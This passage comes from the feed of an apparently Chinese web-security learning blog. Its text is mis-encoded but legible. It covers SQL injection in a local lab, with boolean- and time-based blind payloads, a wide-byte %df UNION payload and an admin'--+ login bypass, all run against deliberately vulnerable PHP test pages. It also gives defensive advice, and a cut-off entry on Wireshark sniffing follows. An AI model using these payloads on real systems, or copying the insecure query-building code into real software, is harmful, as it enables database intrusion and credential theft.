class="keyword">echo</span> <span class="string">&#x27;æ‰§è¡Œçš„SQLè¯­å¥ï¼š&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¸ƒå°”ç›²æ³¨å¯¹åº”é¡µé¢ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306234906381.png"></p><p>æ·»åŠ å•å¼•å·åä¸æŠ¥é”™ï¼Œä½†é¡µé¢å“åº”ä¸åŒ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306234936476.png"></p><p>æ³¨å…¥è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and length(database())&gt;5--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and length(database())&gt;3--+</span><br></pre></td></tr></table></figure><p>æ³¨å…¥ç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306235533662.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210306235615337.png"></p><p>ä¸Šé¢ç»“æœè¯´æ˜å½“å‰æ•°æ®åº“åå­—çš„é•¿åº¦åœ¨3~5ä¹‹é—´ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå¯å¾—åˆ°å…¶ä»–ä¿¡æ¯ã€‚</p><p><strong>æ—¶é—´ç›²æ³¨å¯¹åº”é¡µé¢ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307084559117.png"></p><p>æ·»åŠ å•å¼•å·åä¸æŠ¥é”™ï¼Œä¸”é¡µé¢å“åº”ç›¸åŒ</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307084635657.png"></p><p>æ³¨å…¥è¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1&#39; and if(1&#x3D;0,1,sleep(5))--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;4,sleep(5),1)--+</span><br><span class="line">&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;116,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p>æ³¨å…¥ç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307090147625.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307090340750.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307091305473.png"></p><p><strong>é˜²å¾¡æªæ–½ï¼š</strong></p><p>å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ç­‰ã€‚</p><h1 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h1><p>å½“mysqlæ•°æ®åº“é‡‡ç”¨GBKç¼–ç æ—¶å¯èƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚</p><p>å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œmysqlåœ¨ä½¿ç”¨GBKç¼–ç ï¼ˆGBKå°±æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ä¹‹ä¸€ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚ï¼‰çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ªasciiç è¦å¤§äº128ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ï¼Œè€Œå½“æˆ‘ä»¬è¾“å…¥æœ‰å•å¼•å·æ—¶ä¼šè‡ªåŠ¨åŠ å…¥\è¿›è¡Œè½¬ä¹‰è€Œå˜ä¸º\â€™ï¼ˆåœ¨PHPé…ç½®æ–‡ä»¶ä¸­magic_quotes_gpc=Onçš„æƒ…å†µä¸‹æˆ–è€…ä½¿ç”¨addslasheså‡½æ•°ï¼Œicovå‡½æ•°ï¼Œmysql_real_escape_stringå‡½æ•°ã€mysql_escape_stringå‡½æ•°ç­‰ï¼Œæäº¤çš„å‚æ•°ä¸­å¦‚æœå¸¦æœ‰å•å¼•å·â€™ï¼Œå°±ä¼šè¢«è‡ªåŠ¨è½¬ä¹‰\â€™ï¼Œä½¿å¾—å¤šæ•°æ³¨å…¥æ”»å‡»æ— æ•ˆï¼‰ï¼Œç”±äºå®½å­—èŠ‚å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯åƒASCIIå­—ç¬¦(ä¸€å­—èŠ‚)çš„ç°è±¡ï¼Œå°†åé¢çš„ä¸€ä¸ªå­—èŠ‚ä¸å‰ä¸€ä¸ªå¤§äº128çš„asciiç è¿›è¡Œç»„åˆæˆä¸ºä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ï¼Œæ­¤æ—¶â€™å‰çš„\å°±è¢«åƒäº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨â€™äº†ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§ä»è€Œå¯å®æ–½SQLæ³¨å…¥çš„åˆ©ç”¨ã€‚æœ€å¸¸ä½¿ç”¨çš„å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨%dfï¼Œå…¶å®æˆ‘ä»¬åªè¦ç¬¬ä¸€ä¸ªasciiç å¤§äº128å°±å¯ä»¥äº†ï¼Œæ¯”å¦‚asciiç ä¸º129çš„å°±å¯ä»¥ï¼Œå³ä¸º%81ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.51cto.com/eth10/1962804">æµ…è°ˆå¯¹å®½å­—èŠ‚æ³¨å…¥çš„è®¤è¯†</a></p><p><strong>æµ‹è¯•ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;SQLå®½å­—èŠ‚æ³¨å…¥ç¯å¢ƒ&quot;</span>.<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// è¿æ¥mysql</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ¤æ–­è¿æ¥æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line">   <span class="keyword">die</span> (<span class="string">&quot;è¿æ¥MySQLå‘ç”Ÿé”™è¯¯:&quot;</span> . mysqli_error(<span class="variable">$conn</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©åº“ test</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;æ— æ³•æ­£ç¡®è¿æ¥åˆ°æ•°æ®åº“ï¼&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å–æ¶ˆæŠ¥é”™æ˜¾ç¤º</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®GBKç¼–ç </span></span><br><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&#x27;set names gbk&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¥æ”¶å‚æ•°id</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="comment">// addslashes()å‡½æ•°ï¼Œåœ¨é¢„å®šä¹‰ç¬¦å·å‰æ·»åŠ åæ–œæ </span></span><br><span class="line">    <span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line">    <span class="comment">// æ‰§è¡Œsqlè¯­å¥å¹¶è¿”å›ç»“æœ</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your usernameï¼š&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Your passwordï¼š&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> mysqli_error(<span class="variable">$conn</span>) . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;æ‰§è¡Œçš„SQLè¯­å¥ï¼š&#x27;</span>. <span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å¯¹åº”é¡µé¢å¦‚ä¸‹ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307105837231.png"></p><p><strong>æ³¨å…¥è¯­å¥ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-1%df&#39; union select 1,(select @@datadir),(select @@version_compile_os)--+</span><br></pre></td></tr></table></figure><p><strong>æ³¨å…¥ç»“æœï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307110636955.png"></p><p><strong>é˜²å¾¡æªæ–½ï¼š</strong></p><p>è®¾ç½®MySQLçš„å­—ç¬¦é›†ä¸º UTF-8ã€‚</p><h1 id="POSTæ³¨å…¥"><a href="#POSTæ³¨å…¥" class="headerlink" title="POSTæ³¨å…¥"></a>POSTæ³¨å…¥</h1><p>å½“å¯¹ä»¥POSTæ–¹å¼æäº¤çš„å‚æ•°æ— ä»»ä½•çš„è¿‡æ»¤ï¼Œç›´æ¥æ‹¼æ¥ç”¨æˆ·åå’Œå¯†ç æ¥ä»æ•°æ®åº“ä¸­ç›´æ¥æŸ¥è¯¢ç»“æœå¹¶å®ç°ç™»å½•ç­‰æƒ…å†µï¼Œå¯ç›´æ¥æ„é€ ä¸€ä¸ªsqlè¯­å¥è¶Šè¿‡å¯†ç çš„ç¡®è®¤ï¼Œä¹Ÿå°±æ˜¯ä¿—ç§°çš„ä¸‡èƒ½å¯†ç <code>admin&#39; --+</code>æˆ–<code>admin&#39;#</code></p><p><strong>æµ‹è¯•ä»£ç </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;SQLæ³¨å…¥æµ‹è¯•&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;./sql_login.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">ç”¨æˆ·å:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">å¯†ç ï¼š&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;æäº¤&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="comment">// è¿æ¥mysql</span></span><br><span class="line"><span class="variable">$conn</span>=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">        <span class="comment">//åˆ¤æ–­è¿æ¥æ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;è¿æ¥MySQLå‘ç”Ÿé”™è¯¯:&#x27;</span>.mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// é€‰æ‹©åº“</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;æ— æ³•æ­£ç¡®è¿æ¥åˆ°æ•°æ®åº“ï¼&quot;</span>);</span><br><span class="line"><span class="comment">// è®¾ç½®utf-8ç¼–ç </span></span><br><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line">        <span class="comment">// å–æ¶ˆæŠ¥é”™æ˜¾ç¤º</span></span><br><span class="line">        error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// æ¥æ”¶å‚æ•°</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">// æ‹¼æ¥sqlè¯­å¥å¹¶æ‰§è¡Œ</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM user WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>] . <span class="string">&quot;ï¼Œæ‚¨å·²ç™»å½•æˆåŠŸï¼&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ç™»å½•å¤±è´¥ï¼Œç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ï¼ˆè¯·è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œç™»å½•ï¼‰&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;SQLæ‹¼æ¥ç»“æœï¼š&#x27;</span>.<span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>å¯¹åº”é¡µé¢å¦‚ä¸‹ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307173151304.png" alt="image-20210307173151304"></p><p><strong>æ„é€ ä¸‡èƒ½å¯†ç ç™»å½•ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307120812568.png"></p><p><strong>ä»¥å…¶ä»–æ–¹å¼è¿›è¡Œæ³¨å…¥ï¼š</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307121042343.png"></p><h1 id="æ³¨å…¥æ¼æ´çš„é˜²å¾¡"><a href="#æ³¨å…¥æ¼æ´çš„é˜²å¾¡" class="headerlink" title="æ³¨å…¥æ¼æ´çš„é˜²å¾¡"></a>æ³¨å…¥æ¼æ´çš„é˜²å¾¡</h1><p><strong>ä»£ç æ–¹å‘</strong></p><ol><li>å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œä¾‹å¦‚<code>addslashes()</code> å‡½æ•°åœ¨æŒ‡å®šçš„é¢„å®šä¹‰å­—ç¬¦å‰æ·»åŠ åæ–œæ ï¼ŒæŠŠ<code>&#39;</code>è½¬ä¹‰ä¸º<code>\&#39; </code></li><li>å¯¹ç‰¹å®šçš„å…³é”®è¯è¿›è¡ŒåŒ¹é…è¿‡æ»¤ã€‚å¦‚å¯ä»¥æ£€æµ‹<code>select</code>ã€<code>from</code>ã€<code>union</code>ç­‰å…³é”®è¯ï¼Œå°†å…¶è¿‡æ»¤ã€‚</li><li>å¯¹æ•°æ®ç±»å‹åŠæ•°æ®é•¿åº¦è¿›è¡Œä¸¥æ ¼é™å®šï¼Œé˜²æ­¢ç”¨æˆ·è¾“å…¥è¿‡å¤šçš„æ— ç”¨æ•°æ®ã€‚</li><li>é‡‡ç”¨sqlè¯­å¥é¢„ç¼–è¯‘ï¼ŒSQLå¼•æ“ä¼šé¢„å…ˆè¿›è¡Œè¯­æ³•åˆ†æï¼Œäº§ç”Ÿè¯­æ³•æ ‘ï¼Œç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåé¢æ— è®ºè¾“å…¥çš„æ˜¯ä»€ä¹ˆï¼Œéƒ½ä¸ä¼šå½±å“è¯¥sqlè¯­å¥çš„ è¯­æ³•ç»“æ„ã€‚</li><li>ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ä¼ å…¥çš„å‚æ•°ã€‚</li></ol><p><strong>æœåŠ¡å™¨æ–¹å‘</strong></p><ol><li>å¯¹æ•°æ®åº“é‡‡ç”¨æœ€å°æƒé™åˆ†é…ï¼Œå¦‚æ™®é€šç”¨æˆ·ä¸ç³»ç»Ÿç®¡ç†å‘˜ç”¨æˆ·çš„æƒé™è¿›è¡Œä¸¥æ ¼çš„åŒºåˆ†ï¼Œè¿™æ ·å³ä½¿å¯ä»¥æ‹¿åˆ°æƒé™ä¹Ÿä¸ä¼šé€ æˆæ›´å¤§çš„æŸå¤±ã€‚</li><li>é¿å…æ˜¾ç¤ºSQLæ‰§è¡ŒæŠ¥é”™çš„ä¿¡æ¯ï¼Œé˜²æ­¢æŠ¥é”™ä¿¡æ¯è¢«åˆ©ç”¨ã€‚</li><li>æ•°æ®å±‚çš„ç¼–ç ç»Ÿä¸€ï¼Œé˜²æ­¢è¿‡æ»¤æ¨¡å‹è¢«ç»•è¿‡ã€‚</li></ol><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><blockquote><p>[1] <a href="https://www.cnblogs.com/wangyuyang1016/p/12172026.html">å¸¸è§çš„sqlæ³¨å…¥ç¯å¢ƒæ­å»º</a></p><p>[2] <a href="https://bu1.github.io/2021/01/06/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8%EF%BC%9A%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%89%8D%E7%BC%96%E5%86%99%E7%9A%84%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83/">ç¬¬åä¸€å‘¨ï¼šæ‰‹å·¥æµ‹è¯•ä¹‹å‰ç¼–å†™çš„æ³¨å…¥ç¯å¢ƒ</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WiresharkæŠ“åŒ…ä½“éªŒ</title>
      <link href="posts/31686.html"/>
      <url>posts/31686.html</url>
      
        <content type="html"><![CDATA[<h1 id="å—…æ¢å™¨åŸç†"><a href="#å—…æ¢å™¨åŸç†" class="headerlink" title="å—…æ¢å™¨åŸç†"></a>å—…æ¢å™¨åŸç†</h1><p>å—…æ¢æŠ€æœ¯æ˜¯ç½‘ç»œå®‰å…¨æ”»é˜²æŠ€æœ¯ä¸­å¾ˆé‡è¦çš„ä¸€ç§ï¼Œé€šè¿‡å®ƒå¯ä»¥è·å–ç½‘ç»œä¸­çš„å¤§é‡ä¿¡æ¯ã€‚ä¸ä¸»åŠ¨æ‰«æç›¸æ¯”ï¼Œå—…æ¢æ›´éš¾ä»¥è¢«å¯Ÿè§‰ï¼Œèƒ½å¤Ÿå¯¹ç½‘ç»œä¸­çš„æ´»åŠ¨è¿›è¡Œå®æ—¶ç›‘æ§ã€‚</p><p>ç½‘ç»œå—…æ¢å™¨å®é™…ä¸Šå°±æ˜¯ç½‘ç»œä¸­çš„çªƒå¬å™¨ï¼Œå…¶ç”¨é€”å°±æ˜¯æ•è·åˆ†æç½‘ç»œä¸­çš„æ•°æ®åŒ…ï¼Œå¸®åŠ©ç½‘ç»œç®¡ç†å‘˜å‘ç°å…¥ä¾µã€åˆ†æç½‘ç»œé—®é¢˜ç­‰ç­‰ï¼Œå®ƒæ˜¯èƒ½å¤Ÿè¿›è¡Œå—…æ¢çš„è½¯ä»¶æˆ–ç¡¬ä»¶è®¾å¤‡ã€‚é€šè¿‡å—…æ¢å¾—åˆ°äºŒè¿›åˆ¶çš„æ•°æ®åŒ…åï¼Œå¯¹è¿™äº›æ•°æ®åŒ…è¿›è¡Œè§£æå’Œç†è§£ï¼Œè·å¾—åè®®å­—æ®µä¸ä¼ è¾“çš„æ•°æ®çš„è¿‡ç¨‹å°±æ˜¯ç½‘ç»œåè®®åˆ†æã€‚æ‰€ä»¥è¯´ï¼Œç½‘ç»œå—…æ¢ä¸ç½‘ç»œåè®®åˆ†æè”ç³»ç´§å¯†ã€‚</p><p>å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œé€šè¿‡ç½‘ç»œå—…æ¢ï¼Œè¿›è¡Œåè®®åˆ†æï¼Œèƒ½å¤Ÿçªƒå–å†…éƒ¨æœºå¯†ï¼Œæœé›†ä¿¡æ¯ã€‚è€Œå¯¹äºç®¡ç†å‘˜æ¥è¯´ï¼Œç½‘ç»œå—…æ¢å¯ä»¥å®ç°ç½‘ç»œæµé‡æƒ…å†µçš„ç›‘å¬ï¼Œå®šä½ç½‘ç»œæ•…éšœï¼Œå¹¶ä¸”èƒ½å¤Ÿä¸ºç½‘ç»œå…¥ä¾µæ£€æµ‹æä¾›åº•å±‚çš„æ•°æ®æ¥æºã€‚</p><p>ç½‘ç»œå—…æ¢çš„å…³é”®åœ¨äºä»¥å¤ªç½‘çš„é€šä¿¡æœºåˆ¶å’Œç½‘å¡çš„å·¥ä½œæ¨¡å¼ã€‚è¿„ä»Šä¸ºæ­¢ï¼Œä»¥å¤ªç½‘ä»ç„¶æ˜¯æœ€æ™®éçš„ç»„ç½‘æ–¹æ³•ä¹‹ä¸€ï¼Œè€Œä»¥å¤ªç½‘çš„å…±äº«ç‰¹æ€§å†³å®šäº†å—…æ¢èƒ½å¤ŸæˆåŠŸã€‚ç”±äºä»¥å¤ªç½‘æ˜¯åŸºäºå¹¿æ’­æ–¹å¼ä¼ é€æ•°æ®ï¼Œå› æ­¤ç½‘ç»œä¸­æ‰€æœ‰çš„æ•°æ®ä¿¡å·éƒ½ä¼šè¢«ä¼ é€åˆ°æ¯ä¸€ä¸ªä¸»æœºèŠ‚ç‚¹ï¼Œè¿™æ ·æ¯ä¸€å°æœºå™¨å®é™…ä¸Šéƒ½èƒ½æ¥å—åˆ°æ•°æ®å¸§ã€‚ä¸€ä¸ªç½‘ç»œæ¥å£ä½¿ç”¨ç½‘å¡çš„æ¥æ”¶æ¨¡å¼æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>å¹¿æ’­æ¨¡å¼ï¼ˆBroadcast Modeï¼‰ï¼šè¯¥æ¨¡å¼ä¸‹çš„ç½‘å¡èƒ½å¤Ÿæ¥æ”¶ç½‘ç»œä¸­æ‰€æœ‰ç±»å‹ä¸ºå¹¿æ’­æŠ¥æ–‡çš„æ•°æ®å¸§ã€‚</li><li>ç»„æ’­æ¨¡å¼ï¼ˆMulticast Modeï¼‰ï¼šè¯¥æ¨¡å¼ä¸‹çš„ç½‘å¡èƒ½å¤Ÿæ¥å—ç‰¹å®šçš„ç»„æ’­æ•°æ®ã€‚</li><li>ç›´æ¥æ¨¡å¼ï¼ˆUnicast Modeï¼‰ï¼šè¯¥æ¨¡å¼ä¸‹çš„ç½‘å¡åœ¨å·¥ä½œæ—¶åªæ¥æ”¶ç›®çš„åœ°å€åŒ¹é…æœ¬æœºMACåœ°å€çš„æ•°æ®å¸§ã€‚</li><li>æ··æ‚æ¨¡å¼ï¼ˆPromiscuous Modeï¼‰ï¼šåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œç½‘å¡å¯¹æ•°æ®å¸§ä¸­çš„ç›®çš„MACåœ°å€ä¸åŠ ä»»ä½•æ£€æŸ¥ï¼Œå…¨éƒ¨æ¥æ”¶ã€‚</li></ul><p>å› æ­¤åªè¦å°†ç½‘å¡çš„å·¥ä½œæ¨¡å¼è®¾ç½®ä¸ºâ€œæ··æ‚æ¨¡å¼â€ï¼Œç½‘å¡å°†ä¼šæ¥å—æ‰€æœ‰ä¼ 